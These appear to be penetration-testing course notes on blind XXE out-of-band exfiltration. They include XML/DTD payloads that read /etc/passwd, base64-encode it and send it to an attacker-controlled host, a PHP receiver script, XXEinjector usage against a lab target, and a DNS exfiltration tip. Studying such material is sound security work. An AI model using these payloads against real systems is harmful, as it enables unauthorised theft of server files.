# Blind Data Exfiltration

- Blind situation, where we neither get the output of the XML entities nor do we get any PHP errors displayed

## Out-of-bound Data Exfiltration

- We can utilize a method known as `Out-of-bound (OOB) Data Exfiltration`
    - Used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE
- Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading
- First use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it
- Then create another external parameter entity and reference it to our IP
- After that place the `file` parameter value as part of the URL being requested over HTTP

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

- Simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal

```php
<?php
if(isset($_GET['content'])){
    error_log("\\n\\n" . base64_decode($_GET['content']));
}
?>
```

```bash
$ vi index.php # here we write the above PHP code
$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

```bash
PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

## Automated OOB Exfiltration

- One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector)

```bash
$ git clone <https://github.com/enjoiz/XXEinjector.git>

Cloning into 'XXEinjector'...
...SNIP...
```

- Copy the HTTP request from Burp and write it to a file for the tool to use.
- Write `XXEINJECT` after it as a position locator for the tool

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: <http://10.129.201.94>
Referer: <http://10.129.201.94/blind/>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

- All files get stored in the `Logs` folder

```bash
$ cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % remote SYSTEM "<http://10.10.16.27:8000/xxe.dtd>">
  %remote;
  %oob;
]>
            <root>
            <name>&content;</name>
            <details>Details</details>
            <date>1999-02-03</date>
            </root>
```